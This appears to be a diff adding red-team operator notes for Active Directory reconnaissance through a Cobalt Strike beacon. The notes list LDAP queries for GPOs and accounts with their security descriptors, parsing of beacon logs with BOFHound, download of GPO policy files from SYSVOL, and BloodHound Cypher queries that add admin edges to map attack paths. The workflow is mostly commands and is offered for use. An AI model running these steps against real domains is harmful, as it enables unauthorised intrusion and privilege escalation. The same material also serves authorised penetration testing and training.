@@ -1,1 +1,22 @@
-t
+gather information via LDAP:
+  ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) --attributes *,ntsecuritydescriptor
+  ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor
+copy logs to attacker desktop:
+  scp -r attacker@10.0.0.5:/opt/cobaltstrike/logs .
+then parse with BOFHound:
+  bofhound -i logs
+run bloodhound then navigate to the UI
+upload the json files that were output from BOFHound
+inspect GPOs with:
+  match (N:GPO) return N
+click into any GPOs of interest (e.g. Workstation Admins) and note the Gpcpath 
+  also note the object IDs of any affected computers!
+using the beacon, let's find the policy files for the GPO:
+  beacon> ls \\contoso.com\SysVol\contoso.com\Policies\{2583E34A-BBCE-4061-9972-E2ADAB399BB4}\Machine\Microsoft\Windows NT\SecEdit\
+  beacon> download \\contoso.com\SysVol\contoso.com\Policies\{2583E34A-BBCE-4061-9972-E2ADAB399BB4}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
+once downloaded, we can sync the file to our desktop (View > Downloads)'
+reading this file shows us some group members which we can add manually to bloodhound:
+  MATCH (x:Computer{objectid:'S-1-5-21-3926355307-1661546229-813047887-2101'}) //object ID we noted previously
+  MATCH (y:Group{objectid:'S-1-5-21-3926355307-1661546229-813047887-1106'})  //object ID found in policy file
+  MERGE (y)-[:AdminTo]->(x)
+NOTE: do this for each object ID that we noted previously
